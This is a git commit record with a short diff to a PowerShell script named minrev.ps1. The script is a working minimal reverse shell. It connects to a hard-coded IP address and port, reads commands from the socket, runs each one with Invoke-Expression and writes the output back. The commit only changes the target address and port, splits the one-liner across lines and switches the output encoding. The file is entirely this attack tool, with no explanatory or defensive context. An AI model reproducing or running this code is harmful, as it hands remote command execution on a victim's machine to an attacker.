52d90a1a06f3723ff4d3bd08cbdca88e9010cdbf
JorgMuskens <jorgmuskens@gmail.com>
2022-08-10 17:41:11 +0200

    Update minrev.ps1

--- minrev.ps1
+++ minrev.ps1
@@ -1,1 +1,5 @@
-$sm=(New-Object Net.Sockets.TCPClient("192.168.3.103",8080)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
+$sm=(New-Object Net.Sockets.TCPClient('192.168.254.1',55555)).GetStream();
+[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;
+$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);
+$st=([text.encoding]::UTF8).GetBytes((iex $d 2>&1));
+$sm.Write($st,0,$st.Length)}
